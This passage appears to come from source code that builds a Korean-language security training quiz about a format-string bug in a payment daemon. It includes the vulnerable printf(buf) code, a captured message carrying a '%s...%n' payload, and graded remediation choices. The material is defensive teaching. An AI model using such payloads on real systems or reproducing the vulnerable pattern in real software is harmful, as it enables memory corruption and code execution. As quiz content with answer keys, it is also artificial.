     '      snprintf(buf, sizeof(buf), "[MERCHANT] %s", msg);\n'
     '      printf(buf);            /* <== 형식 문자열에 외부 입력이 직접 들어감 */\n'
     '      fflush(stdout);\n'
     '  }'),
   E('📨', '수신 전문 원문', 'edi capture',
     '$ xxd -l 64 capture/merchant_88213.bin\n'
     '00000000: 3032 3030 ... 2573 2573 2573 2573 2573 256e  0200...%s%s%s%s%s%n\n'
     '\n'
     '>> 가맹점명 필드에 형식 지정자가 들어 있음 (%n 포함)'),
  ],
  V('true',
    '외부에서 들어온 전문이 printf 의 형식 문자열로 그대로 쓰이고 있습니다. '
    '%s 연속으로 스택이 읽히고 %n 으로 메모리 쓰기까지 가능한 상태이며, 실제 크래시가 하루 2~3회 발생 중입니다. '
    '가용성 장애일 뿐 아니라 메모리 쓰기를 통한 코드 실행 가능성도 있습니다. 정탐이며 위험도를 상향해야 합니다.',
    '"가맹점이 이상한 값을 보낸다"는 운영 이슈로 보이지만, 본질은 메모리 쓰기가 가능한 코드 결함입니다. 크래시는 증상이고 원인은 따로 있습니다.'),
  F(
   O('가맹점명 필드에서 % 문자를 제거한 뒤 출력한다', False,
     '$ ./payd < capture/merchant_x.bin\n'
     '>> 다른 경로(거래메모·단말ID)에서 동일 패턴 발견 — 크래시 재현\n'
     '$ grep -rn "printf(.*[a-z_]*);" src/ | grep -v \'"\' | wc -l\n'
     '7',
     '한 필드만 고치면 같은 패턴의 다른 호출 지점이 남습니다. 코드 전수로 잡아야 합니다.'),
   O('형식 문자열을 상수로 고정하고 외부 입력은 인자로 넘긴다', True,
     '$ ./payd < capture/merchant_88213.bin\n'
     '[MERCHANT] %s%s%s%s%s%n        (문자 그대로 출력됨)\n'
     '>> 크래시 없음. 24시간 무중단 운영 확인\n'
     '\n'
     '/* printf(buf) → */\n'
     'printf("%s", buf);\n'
     '\n'
     '$ gcc -Wformat=2 -Wformat-security -Werror ...\n'
     '>> 빌드 단계에서 동일 패턴 7건 전부 검출·수정',
     '형식 문자열은 언제나 상수여야 합니다. 컴파일러 경고를 오류로 승격하면 같은 실수가 다시 들어오지 못합니다.'),
   O('데몬에 자동 재시작을 걸어 서비스 중단을 줄인다', False,
     '$ systemctl status payd\n'
     'Active: active (running)  restarts: 47\n'
     '>> 크래시는 계속되고 거래 유실도 계속됨. 메모리 쓰기 위험은 그대로',
     '증상을 가리면 원인이 보이지 않게 됩니다. 재시작은 사고 중 임시 대응이지 조치가 아닙니다.'))),

])
